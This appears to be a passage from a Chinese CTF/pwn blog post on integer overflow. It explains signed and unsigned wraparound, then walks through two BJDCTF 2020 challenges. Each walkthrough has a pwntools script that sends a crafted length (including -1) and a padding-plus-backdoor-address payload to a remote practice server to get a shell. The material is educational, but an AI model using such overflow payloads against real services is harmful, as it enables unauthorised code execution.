+<li><strong><font style="color:rgb(0, 0, 0) !important;">与有符号运算的共性</font></strong><font style="color:rgb(0, 0, 0);">：有符号</font><code><font style="color:rgb(0, 0, 0);">short int</font></code><font style="color:rgb(0, 0, 0);">运算时，寄存器（</font><code><font style="color:rgb(0, 0, 0);">eax</font></code><font style="color:rgb(0, 0, 0);">）会得到</font><code><font style="color:rgb(0, 0, 0);">0x10000</font></code><font style="color:rgb(0, 0, 0);">，但仅将低 2 字节（</font><code><font style="color:rgb(0, 0, 0);">ax=0x0000</font></code><font style="color:rgb(0, 0, 0);">）写回内存，因此</font><strong><font style="color:rgb(0, 0, 0) !important;">存储结果与无符号一致</font></strong><font style="color:rgb(0, 0, 0);">。</font></li>
+</ul>
+<p><font style="color:rgb(0, 0, 0);">3. 数值层面的逻辑差异</font></p>
+<table>
+<thead>
+<tr>
+<th align="left"><strong><font style="color:rgb(0, 0, 0) !important;">类型</font></strong></th>
+<th align="left"><strong><font style="color:rgb(0, 0, 0) !important;">0xffff 的数值含义</font></strong></th>
+<th align="left"><strong><font style="color:rgb(0, 0, 0) !important;">0xffff + 1 的结果</font></strong></th>
+<th align="left"><strong><font style="color:rgb(0, 0, 0) !important;">结果的合理性</font></strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.85) !important;">有符号</font><code><font style="color:rgb(0, 0, 0);">short int</font></code></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.85) !important;">-1</font></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.85) !important;">0</font></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.85) !important;">符合数学逻辑（-1+1&#x3D;0）</font></td>
+</tr>
+<tr>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.85) !important;">无符号</font><code><font style="color:rgb(0, 0, 0);">short int</font></code></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.85) !important;">65535</font></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.85) !important;">0</font></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.85) !important;">不符合数学逻辑（65535+1≠0）</font></td>
+</tr>
+</tbody></table>
+<p><font style="color:rgb(0, 0, 0);">4. 核心结论</font></p>
+<p><font style="color:rgb(0, 0, 0);">无符号整数的溢出本质是</font><strong><font style="color:rgb(0, 0, 0) !important;">模运算结果</font></strong><font style="color:rgb(0, 0, 0);">（以 “类型最大值 + 1” 为模），而有符号整数的溢出则是</font><strong><font style="color:rgb(0, 0, 0) !important;">补码规则下的数值回绕</font></strong><font style="color:rgb(0, 0, 0);">，二者因 “数值含义的定义不同”，导致同一存储结果的逻辑合理性存在差异。</font></p>
+<h4 id="下界溢出（减法溢出sub）"><a href="#下界溢出（减法溢出sub）" class="headerlink" title="下界溢出（减法溢出sub）"></a>下界溢出（减法溢出sub）</h4><img src="/HFTTC.github.io/images/pwn/1766479992803-6e910e49-d4ba-4a1b-bca8-38907b83f71c-990612.png" alt="1766479992803-6e910e49-d4ba-4a1b-bca8-38907b83f71c.png" style="max-width: 100%; display: block; margin: 0 auto;">
+
+<h4 id="整数溢出的类型"><a href="#整数溢出的类型" class="headerlink" title="整数溢出的类型"></a>整数溢出的类型</h4><img src="/HFTTC.github.io/images/pwn/1766480149096-51ce0c6e-b939-4515-96b7-7c520aeffa5d-236585.png" alt="1766480149096-51ce0c6e-b939-4515-96b7-7c520aeffa5d.png" style="max-width: 100%; display: block; margin: 0 auto;">
+
+<p>malloc申请大小的空间为0xf,将data_len读入到buf中会造成溢出</p>
+<h6 id="read-0-buf-data-len"><a href="#read-0-buf-data-len" class="headerlink" title="read(0,buf,data_len)"></a>read(0,buf,data_len)</h6><p><font style="color:rgba(0, 0, 0, 0.85);">文件描述符（fd）：</font><code><font style="color:rgb(0, 0, 0);">0</font></code><font style="color:rgba(0, 0, 0, 0.85);"> 是标准输入（stdin）的固定描述符（键盘 &#x2F; 管道输入）；</font></p>
+<p><font style="color:rgba(0, 0, 0, 0.85);">buf:内存缓冲区指针：指向一段连续内存（如数组、malloc 分配的空间），用于存储读取到的数据</font></p>
+<p><font style="color:rgba(0, 0, 0, 0.85);">data_len:期望读取的字节数：要求系统最多读取 </font><code><font style="color:rgb(0, 0, 0);">data_len</font></code><font style="color:rgba(0, 0, 0, 0.85);"> 个字节到 </font><code><font style="color:rgb(0, 0, 0);">buf</font></code><font style="color:rgba(0, 0, 0, 0.85);"> 中</font><img src="/HFTTC.github.io/images/pwn/1766480666401-8a37492d-85db-4018-8d82-5e7c7a7233f1-214549.png" alt="1766480666401-8a37492d-85db-4018-8d82-5e7c7a7233f1.png" style="max-width: 100%; display: block; margin: 0 auto;"></p>
+<p>通过IDA分析</p>
+<img src="/HFTTC.github.io/images/pwn/1766481071614-61daae3b-5f48-4581-9c23-5b46e692318a-098047.png" alt="1766481071614-61daae3b-5f48-4581-9c23-5b46e692318a.png" style="max-width: 100%; display: block; margin: 0 auto;">
+
+<p>可以分析到buf至少是228个字节大于0x199u应该是不会有溢出的</p>
+<h3 id="例题-整数溢出"><a href="#例题-整数溢出" class="headerlink" title="例题&#x2F;&#x2F;整数溢出"></a>例题&#x2F;&#x2F;整数溢出</h3><h4 id="1）-BJDCTF-2020-babystack"><a href="#1）-BJDCTF-2020-babystack" class="headerlink" title="1）[BJDCTF 2020]babystack"></a><font style="color:rgb(0, 0, 0);">1）[BJDCTF 2020]babystack</font></h4><img src="/HFTTC.github.io/images/pwn/1766485129984-16845713-8518-462e-b02e-a3c835e48643-820499.png" alt="1766485129984-16845713-8518-462e-b02e-a3c835e48643.png" style="max-width: 100%; display: block; margin: 0 auto;">
+
+<h6 id=""><a href="#" class="headerlink" title=""></a><img src="/HFTTC.github.io/images/pwn/1766485219605-356e217f-3405-4cef-ab1f-fc9f0279c11d-263777.png" alt="1766485219605-356e217f-3405-4cef-ab1f-fc9f0279c11d.png" style="max-width: 100%; display: block; margin: 0 auto;"></h6><h6 id="setvbuf-stdout-0-2-0"><a href="#setvbuf-stdout-0-2-0" class="headerlink" title="setvbuf(stdout, 0, 2, 0)"></a><img src="/HFTTC.github.io/images/pwn/1766487641882-99c7ea5b-8724-48e2-a9d5-1a383df6aca2-067607.png" alt="1766487641882-99c7ea5b-8724-48e2-a9d5-1a383df6aca2.png" style="max-width: 100%; display: block; margin: 0 auto;"><code><font style="color:rgba(0, 0, 0, 0.85);">setvbuf(stdout, 0, 2, 0)</font></code></h6><p><font style="color:rgba(0, 0, 0, 0.85);">的核心是将标准输出设为</font><font style="color:rgb(0, 0, 0) !important;">无缓冲模式</font><font style="color:rgba(0, 0, 0, 0.85);">，在溢出调试、漏洞利用中是关键操作 —— 解决输出缓冲导致的信息丢失，确保调试 &#x2F; 利用过程中能即时看到程序输出，精准分析溢出行为。</font></p>
+<ul>
+<li><code><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">__isoc99_scanf(&quot;%d&quot;, &amp;nbytes);</font></code><font style="color:rgba(0, 0, 0, 0.75);">：让用户输入下次输入时接受的数据的长度。</font></li>
+<li><code><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">read(0, &amp;buf, (unsigned int)nbytes);</font></code><font style="color:rgba(0, 0, 0, 0.75);">：变量</font><code><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">nbytes</font></code><font style="color:rgba(0, 0, 0, 0.75);">用户可控，存在栈溢出。</font></li>
+</ul>
+<h6 id="LODWORD-nbytes-0-（HIDWORD是高三十二位）"><a href="#LODWORD-nbytes-0-（HIDWORD是高三十二位）" class="headerlink" title="LODWORD(nbytes) = 0; （HIDWORD是高三十二位）"></a><code><font style="color:rgba(0, 0, 0, 0.85) !important;">LODWORD(nbytes) = 0;</font></code><font style="color:rgb(0, 0, 0);"> （HIDWORD是高三十二位）</font></h6><p><font style="color:rgb(0, 0, 0);">→ 把 </font><code><font style="color:rgba(0, 0, 0, 0.85) !important;">nbytes</font></code><font style="color:rgb(0, 0, 0);"> 的低 32 位内存区域直接赋值为 0，分两种场景：</font></p>
+<table>
+<thead>
+<tr>
+<th align="left"><code><strong><font style="color:rgb(0, 0, 0);">nbytes</font></strong></code><br/><strong><font style="color:rgb(0, 0, 0) !important;"> </font>****<font style="color:rgb(0, 0, 0) !important;">类型</font></strong></th>
+<th align="left"><strong><font style="color:rgb(0, 0, 0) !important;">执行效果</font></strong></th>
+<th align="left"><strong><font style="color:rgb(0, 0, 0) !important;">内存示例（十六进制）</font></strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.85) !important;">32 位（DWORD）</font></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.85) !important;">整个变量被置为 0（等价于</font><code><font style="color:rgb(0, 0, 0);">nbytes = 0;</font></code><font style="color:rgba(0, 0, 0, 0.85) !important;">）</font></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.85) !important;">原</font><code><font style="color:rgb(0, 0, 0);">0x12345678</font></code><br/><font style="color:rgba(0, 0, 0, 0.85) !important;"> </font><font style="color:rgba(0, 0, 0, 0.85) !important;">→ 置 0 后</font><code><font style="color:rgb(0, 0, 0);">0x00000000</font></code></td>
+</tr>
+<tr>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.85) !important;">64 位（DWORD64）</font></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.85) !important;">低 32 位清 0，高 32 位保持不变</font></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.85) !important;">原</font><code><font style="color:rgb(0, 0, 0);">0x11223344 55667788</font></code><br/><font style="color:rgba(0, 0, 0, 0.85) !important;"> </font><font style="color:rgba(0, 0, 0, 0.85) !important;">→ 置 0 后</font><code><font style="color:rgb(0, 0, 0);">0x11223344</font><font style="color:rgb(0, 0, 0);"> </font></code></td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="left"><strong><font style="color:rgb(0, 0, 0) !important;">操作</font></strong></th>
+<th align="left"><strong><font style="color:rgb(0, 0, 0) !important;">溢出后 nbytes（64 位）</font></strong></th>
+<th align="left"><strong><font style="color:rgb(0, 0, 0) !important;">低 32 位值</font></strong></th>
+<th align="left"><strong><font style="color:rgb(0, 0, 0) !important;">32 位视角下的 read 长度</font></strong></th>
+<th align="left"><strong><font style="color:rgb(0, 0, 0) !important;">结果</font></strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.85) !important;">LODWORD(nbytes)&#x3D;0;</font></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.85) !important;">0x1000FFFF</font></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.85) !important;">0</font></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.85) !important;">0</font></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.85) !important;">无操作，规避溢出</font></td>
+</tr>
+<tr>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.85) !important;">未清零低 32 位</font></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.85) !important;">0x1000FFFF</font></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.85) !important;">0xFFFF</font></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.85) !important;">65535</font></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.85) !important;">缓冲区溢出（风险）</font></td>
+</tr>
+</tbody></table>
+<p><font style="color:rgb(0, 0, 0);">“截断” 的本质是：64 位</font><code><font style="color:rgba(0, 0, 0, 0.85) !important;">nbytes</font></code><font style="color:rgb(0, 0, 0);">本是完整的超大值，但</font><code><font style="color:rgba(0, 0, 0, 0.85) !important;">LODWORD(nbytes)=0</font></code><font style="color:rgb(0, 0, 0);"> 强行把低 32 位 “砍断并清零”，相当于</font><strong><font style="color:rgb(0, 0, 0) !important;">只保留高 32 位、丢弃低 32 位的有效数值</font></strong><font style="color:rgb(0, 0, 0);">；而 32 位程序只能识别低 32 位，因此最终操作长度被 “截断为 0”，从根源上避免了溢出后的超大长度导致的内存越界。</font></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">10</span>]; <span class="comment">// 固定大小10字节缓冲区</span></span><br><span class="line">    <span class="comment">// __isoc99_scanf等价于scanf，无长度限制时，输入超过10字节会溢出</span></span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, buf); <span class="comment">// 攻击者输入100个字符，覆盖buf外的内存</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:#DF2A3F;">简单说一下题</font><font style="color:rgba(0, 0, 0, 0.85);">：通过IDA分析断定，输入长度取一个比较大的值，为后续溢出做准备，寻找覆盖当前栈和rbp的字节数以及后门函数构造payload就可以获取shell去拿flag。</font></p>
+<h5 id="exp-1）"><a href="#exp-1）" class="headerlink" title="exp 1）"></a><font style="color:rgba(0, 0, 0, 0.85);">exp 1）</font></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#导入pwntools模块：</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment">#和靶机进行连接：</span></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29658</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#给nbytes赋值（给值相对大点，太小不行，要让他足够溢出覆盖rbp并寻找到后门函数</span></span><br><span class="line">r.sendline(<span class="string">&#x27;50&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#定义 payload</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">24</span> + p64(<span class="number">0x4006E6</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#发送payload</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#获取靶机交互式终端：</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<img src="/HFTTC.github.io/images/pwn/1766487848011-9e45be0a-0354-406d-8146-9ec5ff827240-834642.png" alt="1766487848011-9e45be0a-0354-406d-8146-9ec5ff827240.png" style="max-width: 100%; display: block; margin: 0 auto;">
+
+<h4 id="2）-BJDCTF-2020-babystack2-0"><a href="#2）-BJDCTF-2020-babystack2-0" class="headerlink" title="2）[BJDCTF 2020]babystack2.0"></a>2）<font style="color:rgb(0, 0, 0);">[BJDCTF 2020]babystack2.0</font><img src="/HFTTC.github.io/images/pwn/1766488499948-d7f5ccbe-7e1c-4472-8a32-d6fedd97d740-906556.png" alt="1766488499948-d7f5ccbe-7e1c-4472-8a32-d6fedd97d740.png" style="max-width: 100%; display: block; margin: 0 auto;"><img src="/HFTTC.github.io/images/pwn/1766488834844-980cb1f8-b61e-47d7-9a32-a15c6b58abc4-684194.png" alt="1766488834844-980cb1f8-b61e-47d7-9a32-a15c6b58abc4.png" style="max-width: 100%; display: block; margin: 0 auto;"><img src="/HFTTC.github.io/images/pwn/1766488746454-4ebeadac-12b7-4582-8f7a-739fbb2846fd-880995.png" alt="1766488746454-4ebeadac-12b7-4582-8f7a-739fbb2846fd.png" style="max-width: 100%; display: block; margin: 0 auto;"></h4><p>不同与上一题，限制了名字长度防止了由于长度不限制造成的栈溢出</p>
+<p><font style="color:rgb(0, 0, 0);background-color:rgba(255, 255, 255, 0.5);">如果想要让read函数存在溢出，起码要让read的nbytes大于0x10，但是又被上面的if条件给限制住了，不能大于0x10，那么这里存在一个整数溢出，如果我们输入的是 -1 那么就可以绕过if条件了，同时可以看到read函数的nbytes是unsigned int，unsigned int是无符号整型，遇到-1就会变成unsigned int的最大值，这样就可以让栈溢出</font></p>
+<h5 id="exp-2）"><a href="#exp-2）" class="headerlink" title="exp 2）"></a><font style="color:rgb(0, 0, 0);background-color:rgba(255, 255, 255, 0.5);">exp 2）</font></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r=remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28281</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">payload=b<span class="string">&#x27;a&#x27;</span>*<span class="number">24</span> + p64(<span class="number">0x40072A</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<img src="/HFTTC.github.io/images/pwn/1766489185552-762dba68-bd76-45ca-b038-45786a5fdfcf-243144.png" alt="1766489185552-762dba68-bd76-45ca-b038-45786a5fdfcf.png" style="max-width: 100%; display: block; margin: 0 auto;">
+
+<font style="color:rgb(0, 0, 0);background-color:rgba(255, 255, 255, 0);">  
+</font>
+
+<img src="/HFTTC.github.io/images/pwn/1766481830654-965bf7df-16c9-4f0f-b4a8-f8794b1be6ce-661341.png" alt="1766481830654-965bf7df-16c9-4f0f-b4a8-f8794b1be6ce.png" style="max-width: 100%; display: block; margin: 0 auto;">
+
+
+<blockquote>
+<p>更新: 2026-04-05 14:00:00<br>原文: <a target="_blank" rel="noopener" href="https://www.yuque.com/idcm/wnemg9/zuig3xggn61of4bc">https://www.yuque.com/idcm/wnemg9/zuig3xggn61of4bc</a></p>
+</blockquote>
+
+    </div>
+    <footer class="article-footer">
+      
+      
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="栈保护全开的攻击手法(例)" class="lazyload">
+        <a href="/HFTTC.github.io/2026/04/28/%E6%A0%88%E4%BF%9D%E6%8A%A4%E5%85%A8%E5%BC%80%E7%9A%84%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95(%E4%BE%8B)/" aria-label="前一篇: 栈保护全开的攻击手法(例)" title="前一篇: 栈保护全开的攻击手法(例)"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+            栈保护全开的攻击手法(例)
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="对于send和sendline的思考" class="lazyload">
+      <a href="/HFTTC.github.io/2026/04/28/%E5%AF%B9%E4%BA%8Esend%E5%92%8Csendline%E7%9A%84%E6%80%9D%E8%80%83/" aria-label="后一篇: 对于send和sendline的思考"  title="后一篇: 对于send和sendline的思考"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          对于send和sendline的思考
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      SEZUVEM=
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        292.6k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        24:34
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA"><span class="toc-number">1.</span> <span class="toc-text">特殊的栈溢出-整数溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">整数溢出介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E7%95%8C%E6%BA%A2%E5%87%BA%EF%BC%88%E5%8A%A0%E6%B3%95%E6%BA%A2%E5%87%BAadd%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">上界溢出（加法溢出add）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%89%E7%AC%A6%E5%8F%B7%E4%B8%8A%E7%95%8C%E6%BA%A2%E5%87%BA"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">有符号上界溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9C%89%E7%AC%A6%E5%8F%B7%E6%95%B4%E6%95%B0%E7%9A%84%E8%A1%A5%E7%A0%81%E5%AD%98%E5%82%A8%E8%A7%84%E5%88%9932767-1-32768"><span class="toc-number">1.1.1.1.1.</span> <span class="toc-text">有符号整数的补码存储规则32767+1&#x3D;-32768</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%80%BB%E7%BB%93"><span class="toc-number">1.1.1.1.2.</span> <span class="toc-text">一句话总结</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%A0%E7%AC%A6%E5%8F%B7%E4%B8%8A%E7%95%8C%E6%BA%A2%E5%87%BA"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">无符号上界溢出</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8B%E7%95%8C%E6%BA%A2%E5%87%BA%EF%BC%88%E5%87%8F%E6%B3%95%E6%BA%A2%E5%87%BAsub%EF%BC%89"><span class="toc-number">1.1.2.</span> <span class="toc-text">下界溢出（减法溢出sub）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.1.3.</span> <span class="toc-text">整数溢出的类型</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#read-0-buf-data-len"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">read(0,buf,data_len)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA"><span class="toc-number">1.2.</span> <span class="toc-text">例题&#x2F;&#x2F;整数溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%EF%BC%89-BJDCTF-2020-babystack"><span class="toc-number">1.2.1.</span> <span class="toc-text">1）[BJDCTF 2020]babystack</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link"><span class="toc-number">1.2.1.1.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#setvbuf-stdout-0-2-0"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">setvbuf(stdout, 0, 2, 0)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#LODWORD-nbytes-0-%EF%BC%88HIDWORD%E6%98%AF%E9%AB%98%E4%B8%89%E5%8D%81%E4%BA%8C%E4%BD%8D%EF%BC%89"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">LODWORD(nbytes) &#x3D; 0; （HIDWORD是高三十二位）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#exp-1%EF%BC%89"><span class="toc-number">1.2.1.4.</span> <span class="toc-text">exp 1）</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%EF%BC%89-BJDCTF-2020-babystack2-0"><span class="toc-number">1.2.2.</span> <span class="toc-text">2）[BJDCTF 2020]babystack2.0</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#exp-2%EF%BC%89"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">exp 2）</span></a></li></ol></li></ol></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="SEZUVEM=" class="lazyload">
+  <div class="sidebar-author-name">SEZUVEM=</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">198</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/HFTTC.github.io/js/script.js"></script>
+
+
+  
+<script src="/HFTTC.github.io/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/HFTTC.github.io/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
